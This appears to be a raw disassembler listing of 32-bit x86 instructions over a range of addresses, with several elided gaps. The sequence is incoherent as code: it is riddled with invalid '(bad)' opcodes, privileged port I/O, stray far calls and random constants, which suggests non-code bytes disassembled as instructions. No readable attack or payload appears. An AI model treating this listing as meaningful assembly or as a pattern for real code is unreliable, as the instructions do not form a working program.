  4187e0:	mov    bl,0x46
  4187e2:	icebp  
  4187e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187e4:	test   eax,0x4b428b31
  4187e9:	cmc    
  4187ea:	jl     0x418792
  4187ec:	sbb    DWORD PTR [ebx-0x13cb7e94],0x200dc67b
  4187f6:	fistp  QWORD PTR [ebp-0x2f318b10]
  4187fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187fd:	aas    
  4187fe:	mov    edi,0xcc7f9a5e
  418803:	mov    ds:0x33f579fe,al
  418808:	mov    eax,0xcc6ffd93
  41880d:	and    BYTE PTR [edx+0x80c4dec],al
  418813:	cmc    
  418814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418815:	jne    0x418827
  418817:	and    ah,BYTE PTR [edx+edi*2+0x2b]
  41881b:	in     eax,0xfa
  41881d:	imul   eax,DWORD PTR [esi-0x5ccd8b57],0x9644dc34
  418827:	test   eax,0x1a4d4393
  41882c:	jle    0x418872
  41882e:	mov    bh,ch
  418830:	ss aas 
  418832:	mov    eax,ds:0x647769be
  418837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418838:	out    dx,eax
  418839:	dec    edi
  41883a:	call   0x161d:0x4fbbc3ed
  418841:	jae    0x418893
  418843:	out    0xdf,eax
  418845:	cdq    
  418846:	mov    al,ds:0x383cf806
  41884b:	loop   0x418842
  41884d:	rcr    DWORD PTR [esi+0x2b8d662d],0xd
  418854:	sbb    bl,BYTE PTR [ebx+0x68f10afe]
  41885a:	jae    0x418833
  41885c:	mov    al,0xd3
  41885e:	ins    BYTE PTR es:[edi],dx
  41885f:	inc    esi
  418860:	ret    
  418861:	push   eax
  418862:	mov    bh,0xa2
  418864:	or     al,0x1c
  418866:	pop    esp
  418867:	and    dl,BYTE PTR [ebp+0x19]
  41886a:	div    esi
  41886c:	or     BYTE PTR [edi+0x0],ah
	...
  4188d6:	xchg   esp,eax
  4188d7:	enter  0x4337,0x7f
  4188db:	push   esp
  4188dd:	fbld   TBYTE PTR [esi-0x7c63c533]
  4188e3:	das    
  4188e4:	popf   
  4188e5:	xchg   DWORD PTR [edi+0x8],esp
  4188e8:	add    DWORD PTR [eax],eax
  4188ea:	add    BYTE PTR [ecx],al
  4188ec:	add    BYTE PTR [eax],al
  4188ee:	ror    esi,1
  4188f0:	cwde   
  4188f1:	fistp  QWORD PTR [edx+edx*1-0xc734ad2]
  4188f8:	jg     0x418909
  4188fa:	pop    esi
  4188fb:	aas    
  4188fc:	and    DWORD PTR [esi-0x3d],edi
  4188ff:	stc    
  418900:	sbb    al,0x90
  418902:	shl    eax,cl
  418904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418905:	xchg   bx,ax
  418907:	pop    eax
  418908:	fwait
  418909:	cs mov edi,0xdb8a7f7
  41890f:	push   cs
  418910:	push   ds
  418911:	aam    0xa5
  418913:	call   0x8ef57d9f
  418918:	and    DWORD PTR [eax+ecx*4-0x67a57b4b],ebp
  41891f:	pop    esp
  418920:	mov    ebp,ebp
  418922:	xor    BYTE PTR [edx],dl
  418924:	clc    
  418925:	or     BYTE PTR [esp+eiz*2],cl
  418928:	lds    ebp,FWORD PTR [ebp+0x77]
  41892b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41892c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41892d:	xchg   esp,eax
  41892e:	cmp    BYTE PTR [edx],dl
  418930:	scas   eax,DWORD PTR es:[edi]
  418931:	mov    ds:0x9a139370,eax
  418936:	test   DWORD PTR [ecx-0x45f9206a],eax
  41893c:	fs lock xchg ecx,eax
  41893f:	xor    BYTE PTR [ebp+0x51],bl
  418942:	bts    DWORD PTR [ecx-0xc],eax
  418946:	pusha  
  418947:	cmp    BYTE PTR [esi],dl
  418949:	pop    ecx
  41894a:	(bad)  
  41894b:	js     0x4188ce
  41894d:	mov    ah,BYTE PTR [ebp+0x12]
  418950:	in     eax,dx
  418951:	repz sbb eax,0x9a57f893
  418957:	sub    BYTE PTR [ebx+eiz*4+0x58ded8e3],cl
  41895e:	sub    eax,0x1e332749
  418963:	and    eax,DWORD PTR [edx-0x117d875a]
  418969:	mov    edi,0xc72f5af1
  41896e:	loop   0x418918
  418970:	cmc    
  418971:	lods   al,BYTE PTR ds:[esi]
  418972:	rol    DWORD PTR [esi-0x4c],1
  418975:	ins    BYTE PTR es:[edi],dx
  418976:	lock movnti DWORD PTR [ebx-0x6e],ecx
  41897b:	ja     0x418918
  41897d:	aad    0x29
  41897f:	imul   esp,DWORD PTR [ebp+0x4e],0x18
  418983:	xchg   edx,eax
  418984:	ja     0x4189b7
  418986:	stos   DWORD PTR es:[edi],eax
  418987:	inc    ebx
  418988:	sub    esp,esp
  41898a:	add    BYTE PTR [eax],cl
  41898c:	dec    ebp
  41898d:	stc    
  41898e:	out    dx,al
  41898f:	mov    dh,0x12
  418991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418992:	ins    BYTE PTR es:[edi],dx
  418993:	(bad)  
  418995:	hlt    
  418996:	stos   BYTE PTR es:[edi],al
  418997:	ja     0x4189da
  418999:	retf   
  41899a:	(bad)  
  41899b:	pop    ebp
  41899c:	push   ss
  41899d:	push   0xffffffdd
  41899f:	mov    bh,0x16
  4189a1:	dec    ebp
  4189a2:	sub    esi,DWORD PTR [edx]
  4189a4:	inc    ecx
  4189a5:	cmp    BYTE PTR [ecx],al
  4189a7:	jb     0x41899b
  4189a9:	cmp    eax,0x987b5bfd
  4189ae:	cmc    
  4189af:	in     eax,0x39
  4189b1:	das    
  4189b2:	popf   
  4189b3:	sar    DWORD PTR [ebx+0x3d05c285],0xd2
  4189ba:	cmp    esp,eax
  4189bc:	sbb    al,0xe8
  4189be:	inc    ecx
  4189bf:	pop    ss
  4189c0:	test   al,0x8e
  4189c2:	sub    bh,0x2d
  4189c5:	test   al,0x74
  4189c7:	loop   0x418a29
  4189c9:	ins    DWORD PTR es:[edi],dx
  4189ca:	test   eax,0xce56d8b
  4189cf:	pusha  
  4189d0:	test   BYTE PTR [ebp-0x78f3f1bc],al
  4189d6:	pop    ecx
  4189d7:	icebp  
  4189d8:	xchg   ebp,eax
  4189d9:	or     eax,0x3753519
  4189de:	stc    
  4189df:	fld    QWORD PTR [eax]
  4189e1:	das    
  4189e2:	mov    bl,0x14
  4189e4:	int3   
  4189e5:	shl    bl,cl
  4189e7:	or     BYTE PTR [ecx],0x6c
  4189ea:	bound  ecx,QWORD PTR [ecx]
  4189ec:	and    dh,BYTE PTR [edx+0x0]
	...
  418a56:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0x3aa96d69
  418a65:	and    DWORD PTR [edi+0x9],0x1000001
  418a6c:	add    BYTE PTR [eax],al
  418a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a6f:	std    
  418a70:	cmp    DWORD PTR [edx],ecx
  418a72:	cld    
  418a73:	dec    eax
  418a74:	xor    edi,DWORD PTR [edi-0x707818f1]
  418a7a:	dec    ecx
  418a7b:	out    0xc8,eax
  418a7d:	xor    bl,0x9
  418a80:	jge    0x418a9b
  418a82:	shl    DWORD PTR [esi-0x33],1
  418a85:	mov    dh,0x5c
  418a87:	mov    DWORD PTR [ecx+0xfbf5cd5],ebx
  418a8d:	aam    0x0
  418a8f:	test   BYTE PTR [ecx+eax*4+0x7d],cl
  418a93:	je     0x418a87
  418a95:	ins    BYTE PTR es:[edi],dx
  418a96:	mov    ebx,0xf34ed4dc
  418a9b:	add    edi,edi
  418a9d:	push   cs
  418a9e:	pop    eax
  418a9f:	retf   
  418aa0:	jmp    0x93cb:0xe77874ae
  418aa7:	mov    ah,0xaf
  418aa9:	mov    ds:0x65e83998,eax
  418aae:	lods   eax,DWORD PTR ds:[esi]
  418aaf:	jo     0x418b1c
  418ab1:	inc    ebx
  418ab2:	pusha  
  418ab3:	xor    BYTE PTR [ecx],dh
  418ab5:	scas   al,BYTE PTR es:[edi]
  418ab6:	(bad)  
  418ab7:	cld    
  418ab8:	xchg   ebp,eax
  418ab9:	jmp    0x418a44
  418abb:	scas   al,BYTE PTR es:[edi]
  418abc:	dec    esi
  418abd:	pop    esp
  418abe:	not    DWORD PTR [eax+eax*1-0x60d88577]
  418ac5:	jno    0x418ac9
  418ac7:	dec    esp
  418ac8:	pop    eax
  418ac9:	test   DWORD PTR ds:0x4f6cc9fc,esi
  418acf:	setns  BYTE PTR [eax]
  418ad2:	dec    edi
  418ad3:	mov    ch,BYTE PTR [esi+edi*8-0x1887bb1e]
  418ada:	out    dx,eax
  418adb:	mov    edi,DWORD PTR [ebp-0x70b8cc4e]
  418ae1:	adc    DWORD PTR [ebp-0x57],ebp
  418ae4:	add    edx,DWORD PTR [edx+ecx*1-0x3]
  418ae8:	test   eax,0xf42f073a
  418aed:	jne    0x418b5b
  418aef:	(bad)  
  418af0:	(bad)  
  418af1:	dec    edi
  418af2:	std    
  418af3:	(bad)  
  418af4:	and    al,0x90
  418af6:	and    al,0x84
  418af8:	mov    cl,0xa3
  418afa:	imul   ecx,edi,0xb3c758fc
  418b00:	iret   
  418b01:	ret    
  418b02:	call   0xc3f840bf
  418b07:	pop    edx
  418b08:	mov    edi,0x231322bf
  418b0d:	mov    cl,BYTE PTR [edx]
  418b0f:	test   al,0x6c
  418b11:	(bad)  
  418b13:	pop    eax
  418b14:	cld    
  418b15:	fwait
  418b16:	inc    edx
  418b17:	daa    
  418b18:	jmp    0x78913e9f
  418b1d:	adc    DWORD PTR [eax-0x45a4fb36],esi
  418b23:	mov    edx,0x8d0301be
  418b28:	icebp  
  418b29:	test   eax,0x7cda152b
  418b2e:	xor    eax,0xc12081d3
  418b33:	cld    
  418b34:	idiv   BYTE PTR [ebx-0x1]
  418b37:	push   es
  418b38:	mov    ecx,0x37ec33d3
  418b3d:	mov    WORD PTR [eax-0x2b7949bc],ss
  418b43:	adc    DWORD PTR [ecx+0xdac080a],0xa474aa52
  418b4d:	repz jg 0x418b37
  418b50:	imul   esp,DWORD PTR [edx-0x4f],0x1f096c53
  418b57:	shl    BYTE PTR ds:0x54da7222,cl
  418b5d:	out    dx,eax
  418b5e:	sti    
  418b5f:	ins    BYTE PTR es:[edi],dx
  418b60:	push   es
  418b61:	retf   
  418b62:	and    BYTE PTR [ebx],dl
  418b64:	inc    edi
  418b65:	sbb    bl,bl
  418b67:	jno    0x418bde
  418b69:	test   DWORD PTR [ebp+0x32],edi
  418b6c:	fstp   QWORD PTR [eax+eax*1+0x0]
	...
  418bd4:	add    BYTE PTR [eax],al
  418bd6:	jl     0x418beb
  418bd8:	test   DWORD PTR [edx],esi
  418bda:	out    dx,eax
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0x6e
  418be3:	push   ss
  418be4:	mov    dh,0xe1
  418be6:	or     al,BYTE PTR [bx+di]
  418be9:	add    BYTE PTR [eax],al
  418beb:	add    DWORD PTR [eax],eax
  418bed:	add    BYTE PTR [ecx+0x40],ch
  418bf0:	lea    eax,[ebx-0x56]
  418bf3:	mov    esp,0xc28b56a3
  418bf8:	iret   
  418bf9:	pop    ss
  418bfa:	stc    
  418bfb:	pop    esi
  418bfc:	hlt    
  418bfd:	and    eax,0xbb1fbcf4
  418c02:	sar    BYTE PTR [ebx],1
  418c04:	pop    eax
  418c05:	push   0x30
  418c07:	int3   
  418c08:	jle    0x418bed
  418c0a:	or     eax,0xeae8cf62
  418c0f:	aaa    
  418c10:	cmp    edx,DWORD PTR [ebp+0x6b]
  418c13:	test   eax,0x308ba24d
  418c18:	leave  
  418c19:	mov    dl,0x6d
  418c1b:	test   eax,0xb6b905e5
  418c20:	cmp    DWORD PTR [eax],0xffffffa3
  418c23:	pushf  
  418c24:	lsl    ebp,sp
  418c27:	dec    edx
  418c28:	mov    ecx,0x32764423
  418c2d:	inc    edi
  418c2e:	cmp    ch,bl
  418c30:	cwde   
  418c31:	pop    es
  418c32:	mov    dl,0x60
  418c34:	lea    ebx,[ecx+edx*2-0x34]
  418c38:	sbb    al,0x8c
  418c3a:	clc    
  418c3b:	ret    0x4820
  418c3e:	jp     0x418be0
  418c40:	mov    dl,0x3e
  418c42:	and    DWORD PTR [edi],ebx
  418c44:	hlt    
  418c45:	rcr    BYTE PTR [ecx+0x7b],cl
  418c48:	outs   dx,DWORD PTR ds:[esi]
  418c49:	xor    ah,BYTE PTR [edi+edx*2+0x6d1a7aed]
  418c50:	mov    cl,0xe9
  418c52:	fiadd  DWORD PTR [esi+esi*4-0x26]
  418c56:	jo     0x418c9b
  418c58:	xor    al,0xf3
  418c5a:	and    BYTE PTR [edx+0x191d1445],al
  418c60:	jle    0x418bf7
  418c62:	pop    edi
  418c63:	fsub   QWORD PTR [edi+esi*1-0x53e8eb07]
  418c6a:	imul   eax,DWORD PTR [edx],0xffffffaf
  418c6d:	xor    ebp,DWORD PTR [eax+0x6c]
  418c70:	and    BYTE PTR [esi+0x30ff9ba],cl
  418c76:	gs jg  0x418c1d
  418c79:	cld    
  418c7a:	mov    DWORD PTR [esi-0x5432138a],edi
  418c80:	lds    ebp,FWORD PTR [ebp-0x6be223ed]
  418c86:	pushf  
  418c87:	or     al,0x2b
  418c89:	pushf  
  418c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c8c:	out    0x88,eax
  418c8e:	mov    eax,ds:0xdd923648
  418c93:	xor    al,0x73
  418c95:	jo     0x418ced
  418c97:	dec    esi
  418c98:	or     dl,BYTE PTR [edx]
  418c9a:	push   edx
  418c9b:	test   eax,0x75c342e8
  418ca0:	pop    ss
  418ca1:	push   0x6126ec57
  418ca6:	jae    0x418d14
  418ca8:	neg    BYTE PTR [ebx-0x6bb25158]
  418cae:	iret   
  418caf:	xchg   esp,eax
  418cb0:	dec    esi
  418cb1:	mov    ebx,eax
  418cb3:	jge    0x418d02
  418cb5:	mov    ebp,0x3bc02ec9
  418cba:	les    ebp,FWORD PTR [edi]
  418cbc:	pop    es
  418cbd:	jge    0x418c6f
  418cbf:	mov    ah,0xad
  418cc1:	mov    ebp,0xf619b8b
  418cc6:	leave  
  418cc7:	push   cs
  418cc8:	sub    al,0xfb
  418cca:	xor    eax,0x31251f34
  418ccf:	pop    ecx
  418cd0:	mov    esp,0x7b88e82a
  418cd5:	es nop
  418cd7:	stc    
  418cd8:	aad    0x78
  418cda:	shl    BYTE PTR [edi+0xc16a437],1
  418ce0:	imul   ecx,DWORD PTR [edx+0x22124308],0xffffffbe
  418ce7:	fcom   DWORD PTR [edi-0x63d472ca]
  418ced:	repz add BYTE PTR [eax],al
	...
  418d54:	add    BYTE PTR [eax],al
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	rol    BYTE PTR [ecx+0x6720cd11],cl
  418d67:	or     eax,DWORD PTR [ecx]
  418d69:	add    BYTE PTR [eax],al
  418d6b:	add    DWORD PTR [eax],eax
  418d6d:	add    dh,al
  418d6f:	and    eax,0x4630be2a
  418d74:	pop    ecx
  418d75:	les    esp,FWORD PTR [edi-0x3]
  418d78:	mov    BYTE PTR [ebx*2-0x15346b11],bh
  418d7f:	sbb    DWORD PTR [ebp+0x4ddb4242],ebx
  418d85:	inc    ebp
  418d86:	lods   al,BYTE PTR ds:[esi]
  418d87:	mov    ?,WORD PTR [ebp-0x39]
  418d8a:	jmp    0x418d82
  418d8c:	add    DWORD PTR [edx+0x36e6bb16],0x356d3d3e
  418d96:	repnz cmp DWORD PTR [esp+edx*4-0x9],edx
  418d9b:	int    0x12
  418d9d:	nop
  418d9e:	leave  
  418d9f:	jge    0x418e02
  418da1:	adc    al,0xb7
  418da3:	jle    0x418d75
  418da5:	ins    BYTE PTR es:[edi],dx
  418da6:	mov    ah,0x84
  418da8:	leave  
  418da9:	loopne 0x418db3
  418dab:	shl    DWORD PTR [eax+0x43],cl
  418dae:	sub    DWORD PTR [esi-0x7e53d951],ebx
  418db4:	push   0x61
  418db6:	ins    BYTE PTR es:[edi],dx
  418db7:	sti    
  418db8:	nop
  418db9:	dec    ecx
  418dba:	cmp    bl,ch
  418dbc:	loopne 0x418e32
  418dbe:	das    
  418dbf:	or     edx,DWORD PTR [edx-0x7061a52b]
  418dc5:	xor    eax,0x4e924cb3
  418dca:	mov    ds:0xaaece1b2,al
  418dcf:	shl    DWORD PTR [eax],cl
  418dd1:	out    dx,eax
  418dd2:	(bad)  
  418dd3:	cwde   
  418dd4:	mov    bl,BYTE PTR [edx]
  418dd6:	nop
  418dd7:	mov    esp,0x7b9f977c
  418ddc:	sar    BYTE PTR [ebp-0x20],0x3b
  418de0:	adc    cl,BYTE PTR [ebp+0x16886e6a]
  418de6:	xchg   edx,eax
  418de7:	add    eax,0xf2b14b03
  418dec:	stos   DWORD PTR es:[edi],eax
  418ded:	aaa    
  418dee:	imul   ecx,DWORD PTR [eax+ebp*8+0x5c],0xffffffd8
  418df3:	aas    
  418df4:	and    dl,bl
  418df6:	push   edx
  418df7:	lods   al,BYTE PTR ds:[esi]
  418df8:	and    eax,0x27c0f2ac
  418dfd:	adc    eax,0xe166137c
  418e02:	(bad)  
  418e03:	jnp    0x418d9e
  418e05:	xor    esi,DWORD PTR [esp+ecx*8]
  418e08:	mov    WORD PTR [ecx],fs
  418e0a:	sbb    al,0xbd
  418e0c:	jmp    0x1036d37d
  418e11:	loopne 0x418d96
  418e13:	pushf  
  418e14:	out    dx,al
  418e15:	lock es ret 0xbe18
  418e1a:	sahf   
  418e1b:	and    DWORD PTR [edi+eax*8-0x29],eax
  418e1f:	mov    bl,0x64
  418e21:	les    eax,FWORD PTR [ebx-0x73ecc3ce]
  418e27:	jne    0x418db4
  418e29:	out    0x4e,al
  418e2b:	loope  0x418e54
  418e2d:	sub    bl,bl
  418e2f:	xchg   dl,bh
  418e31:	(bad)  
  418e32:	loop   0x418de8
  418e34:	stc    
  418e35:	dec    edi
  418e36:	pop    esp
  418e37:	mov    eax,0x66b34275
  418e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e3d:	cli    
  418e3e:	mov    cl,0xda
  418e40:	je     0x418ea5
  418e42:	mov    esi,0x7f07bf2f
  418e47:	mov    ebx,eax
  418e49:	call   0xe448df1a
  418e4e:	or     al,0xe2
  418e50:	pop    edx
  418e51:	sahf   
  418e52:	jmp    0x418e07
  418e54:	add    eax,0x287eb6f2
  418e59:	push   edx
  418e5a:	popa   
  418e5b:	pop    esp
  418e5c:	gs mov fs,esp
  418e5f:	push   esi
  418e60:	aad    0xea
  418e62:	inc    edx
  418e63:	test   DWORD PTR [esi+ebp*2],0xe02fe16c
  418e6a:	pop    ebx
  418e6b:	nop
  418e6c:	je     0x418e0f
	...
  418ed6:	push   cs
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx+0x1c]
  418ee3:	xchg   esp,eax
  418ee4:	int3   
  418ee5:	call   0x100:0x10c67
  418eec:	add    BYTE PTR [eax],al
  418eee:	inc    edx
  418eef:	xor    ch,BYTE PTR [edx]
  418ef1:	arpl   WORD PTR [edx],sp
  418ef3:	push   esi
  418ef4:	or     edi,esi
  418ef6:	lahf   
  418ef7:	(bad)  
  418ef8:	fidiv  WORD PTR [ebx+0x4b]
  418efb:	sub    al,0x63
  418efd:	fdivr  DWORD PTR [ebx]
  418eff:	cmp    eax,0x1a9c4297
  418f04:	addr16 fcomi st,st(7)
  418f07:	loope  0x418f12
  418f09:	mov    edi,0xb0fc164c
  418f0e:	xor    bh,BYTE PTR [esi]
  418f10:	inc    edx
  418f11:	jb     0x418f6c
  418f13:	(bad)
  418f17:	push   ss
  418f18:	mov    al,0xcb
  418f1a:	jns    0x418eb8
  418f1c:	xchg   edi,eax
  418f1d:	sbb    BYTE PTR [ecx+0x7a],bl
  418f20:	ins    BYTE PTR es:[edi],dx
  418f21:	cmp    al,0x8b
  418f23:	mov    dh,0xd0
  418f25:	push   edi
  418f26:	xchg   ebx,eax
  418f27:	add    eax,esi
  418f29:	pop    esi
  418f2a:	jae    0x418f84
  418f2c:	ins    BYTE PTR es:[edi],dx
  418f2d:	jp     0x418f19
  418f2f:	and    BYTE PTR [ecx],cl
  418f31:	xchg   DWORD PTR [edi],esi
  418f33:	cmc    
  418f34:	scas   al,BYTE PTR es:[edi]
  418f35:	lods   eax,DWORD PTR ds:[esi]
  418f36:	or     esi,DWORD PTR [eax-0x285dec7d]
  418f3c:	and    dh,ah
  418f3e:	xor    ebx,ebp
  418f40:	push   esp
  418f41:	aad    0xfa
  418f43:	ret    
  418f44:	and    esi,DWORD PTR [ebp-0x25]
  418f47:	push   ebx
  418f48:	push   esp
  418f49:	in     eax,0x7d
  418f4b:	push   esp
  418f4c:	shl    BYTE PTR [edi],cl
  418f4e:	xchg   DWORD PTR cs:[edi],ecx
  418f51:	sub    BYTE PTR [esi-0x1d],ch
  418f54:	call   0x289e9666
  418f59:	adc    eax,0x1d092f44
  418f5e:	mov    esi,0xf5c014f3
  418f63:	push   esp
  418f64:	ins    BYTE PTR es:[edi],dx
  418f65:	popa   
  418f66:	xchg   esp,eax
  418f67:	mov    esp,0xb77226e1
  418f6c:	test   BYTE PTR ds:0x55025df4,0x15
  418f73:	retf   0x6c37
  418f76:	std    
  418f77:	ins    BYTE PTR es:[edi],dx
  418f78:	adc    eax,0x1ee1787a
  418f7d:	push   es
  418f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f7f:	jmp    0x418f33
  418f81:	push   es
  418f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f83:	adc    DWORD PTR [ecx+ebx*2],edi
  418f86:	into   
  418f87:	call   0x6d1d:0x1a614b64
  418f8e:	push   edx
  418f8f:	or     sp,0x2
  418f93:	add    esp,eax
  418f95:	push   ss
  418f96:	or     dh,0x74
  418f99:	(bad)  
  418f9b:	sbb    BYTE PTR [ebx-0x33ba1e4f],dl
  418fa1:	mul    esi
  418fa3:	push   ecx
  418fa4:	in     al,0x8f
  418fa6:	rcl    ecx,1
  418fa8:	push   edx
  418fa9:	push   ss
  418faa:	in     al,dx
  418fab:	jmp    0x241e:0x4271bb37
  418fb2:	popf   
  418fb3:	add    eax,0x5816fa57
  418fb8:	cmp    al,BYTE PTR [ecx-0x2b75e001]
  418fbe:	ins    DWORD PTR es:[edi],dx
  418fbf:	or     eax,DWORD PTR [ebp-0x6c]
  418fc2:	test   al,0x8d
  418fc4:	outs   dx,BYTE PTR ds:[esi]
  418fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fc6:	adc    al,0x63
  418fc8:	aad    0xb6
  418fca:	arpl   sp,di
  418fcc:	mov    dh,0x2a
  418fce:	sbb    BYTE PTR ds:[ecx-0x5f75a613],cl
  418fd5:	adc    al,0xbb
  418fd7:	and    BYTE PTR [eax],dl
  418fd9:	dec    ebx
  418fda:	xor    eax,0x10ea4131
  418fdf:	stos   BYTE PTR es:[edi],al
  418fe0:	adc    bh,BYTE PTR [ebx-0x55]
  418fe3:	push   0x46
  418fe5:	pop    eax
  418fe6:	cmc    
  418fe7:	push   ebx
  418fe8:	into   
  418fe9:	test   al,0x6b
  418feb:	xor    DWORD PTR [esi],0xef
	...
  419055:	add    BYTE PTR [edi+edx*4],bl
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx+0x37eaf1a7]
  419063:	or     ecx,DWORD PTR [edi+esi*2+0x67]
  419067:	or     eax,0x1000001
  41906c:	add    BYTE PTR [eax],al
  41906e:	xor    DWORD PTR ds:0xab4adfc1,esi
  419074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419075:	das    
  419076:	jnp    0x41903e
  419078:	sar    DWORD PTR [esi+0x13d562ac],cl
  41907e:	or     eax,ecx
  419080:	test   eax,0xdccb1df8
  419085:	mov    esi,edx
  419087:	and    dl,BYTE PTR [ebp+0x49190bfa]
  41908d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41908e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41908f:	add    DWORD PTR [esp+edi*4+0xa],esp
  419093:	mov    ch,BYTE PTR [edi-0x174d0fc2]
  419099:	add    al,0xe6
  41909b:	dec    edx
  41909c:	pop    ecx
  41909d:	dec    ebx
  41909e:	xchg   edi,eax
  41909f:	pop    eax
  4190a0:	xchg   ebp,eax
  4190a1:	test   al,0x82
  4190a3:	xor    bl,dh
  4190a5:	and    cl,ch
  4190a7:	xchg   ebp,ebp
  4190a9:	pop    esp
  4190aa:	or     DWORD PTR [ebx-0x2b],0xffffffd8
  4190ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190af:	in     eax,0xbc
  4190b1:	(bad)  
  4190b2:	arpl   WORD PTR [ebx+0x3a],dx
  4190b5:	ja     0x41911c
  4190b7:	mov    ebp,0x849ee6ff
  4190bc:	(bad)  
  4190bd:	mov    eax,ds:0x94250fa1
  4190c2:	lahf   
  4190c3:	push   0x45
  4190c5:	jecxz  0x419142
  4190c7:	push   eax
  4190c8:	out    0x4a,eax
  4190ca:	xor    ebx,edi
  4190cc:	inc    eax
  4190cd:	mov    WORD PTR [edi-0x38109552],fs
  4190d3:	mov    bh,0xfe
  4190d5:	aas    
  4190d6:	add    al,0xd8
  4190d8:	jbe    0x4190b6
  4190da:	(bad)  
  4190db:	jecxz  0x419061
  4190dd:	mov    esi,0xf667a4f9
  4190e2:	adc    edi,DWORD PTR [eax]
  4190e4:	xchg   BYTE PTR [ecx+0x4327d562],ch
  4190ea:	xor    al,0xb3
  4190ec:	sbb    eax,0xa98a9671
  4190f1:	sti    
  4190f2:	add    eax,0xea99ba18
  4190f7:	scas   eax,DWORD PTR es:[edi]
  4190f8:	or     BYTE PTR [eax],bl
  4190fa:	jg     0x4190af
  4190fc:	dec    ebp
  4190fd:	pop    ebx
  4190fe:	pop    edi
  4190ff:	lods   eax,DWORD PTR ds:[esi]
  419100:	adc    BYTE PTR [edx],ah
  419102:	jle    0x419181
  419104:	sub    DWORD PTR [edi+0x76dfd000],0xcb18c62
  41910e:	lea    eax,[edx]
  419110:	cdq    
  419111:	dec    edi
  419112:	arpl   WORD PTR [ebx-0x46],bx
  419115:	dec    ebx
  419116:	dec    esi
  419117:	jl     0x4190ff
  419119:	inc    esi
  41911a:	xchg   edi,eax
  41911b:	dec    ecx
  41911c:	mov    dh,0x2
  41911e:	mov    ah,dh
  419120:	sub    dl,BYTE PTR [ebx+0x30e517ec]
  419126:	dec    edx
  419127:	loope  0x4191a1
  419129:	test   al,0x28
  41912b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41912c:	sub    DWORD PTR [edi],ecx
  41912e:	adc    BYTE PTR [ebx+0x22],bh
  419131:	scas   eax,DWORD PTR es:[edi]
  419132:	and    DWORD PTR [ebp+0x2],ebp
  419135:	xor    ah,BYTE PTR [ebp-0x32]
  419138:	jg     0x4190cf
  41913a:	mov    ?,WORD PTR [edi-0x6c691bb8]
  419140:	add    eax,0x18c0951f
  419145:	in     al,0x6b
  419147:	clc    
  419148:	out    dx,eax
  419149:	dec    esi
  41914a:	xchg   ebx,eax
  41914b:	pusha  
  41914c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41914d:	enter  0x51aa,0x69
  419151:	dec    esp
  419152:	sbb    dh,al
  419154:	les    esi,FWORD PTR [ecx+0x25271159]
  41915a:	iret   
  41915b:	push   edx
  41915c:	das    
  41915d:	jecxz  0x41919f
  41915f:	cmp    DWORD PTR [ebp-0x68a5082e],esp
  419165:	xchg   ebx,eax
  419166:	push   0xffffffe0
  419168:	jl     0x4191a2
  41916a:	mov    ebx,DWORD PTR [esi+0xd504]
	...
  4191d4:	add    BYTE PTR [eax],al
  4191d6:	scas   eax,DWORD PTR es:[edi]
  4191d7:	test   DWORD PTR [esi-0xa441be],ebx
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     al,BYTE PTR [ecx+0x6773c684]
  4191e7:	push   cs
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	add    BYTE PTR [ecx],al
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	sbb    cl,BYTE PTR [edx-0x17f08522]
  4191f4:	in     eax,0x65
  4191f6:	retf   0xaebe
  4191f9:	pusha  
  4191fa:	test   al,0xeb
  4191fc:	pop    ecx
  4191fd:	or     BYTE PTR [esi-0x5f],cl
  419200:	mov    BYTE PTR [esi+ebp*1-0x45],bl
  419204:	pop    esi
  419205:	fdivr  DWORD PTR [ecx-0x4f]
  419208:	lahf   
  419209:	shl    edx,0x56
  41920c:	call   0x818bdc00
  419211:	pushf  
  419212:	ins    DWORD PTR es:[edi],dx
  419213:	mov    dh,0x5
  419215:	in     al,0x9d
  419217:	ds in  al,0x1d
  41921a:	add    DWORD PTR es:[esi-0xb88ca15],edx
  419221:	cdq    
  419222:	sub    ah,BYTE PTR [ecx-0xa1dedfd]
  419228:	or     DWORD PTR [edx+ecx*4+0x61],edi
  41922c:	popf   
  41922d:	pop    ds
  41922e:	sbb    al,0x11
  419230:	fld    QWORD PTR [edi-0x62]
  419233:	pop    edx
  419234:	push   es
  419235:	imul   edi,DWORD PTR [ebp-0x5442be70],0x27cfcfa3
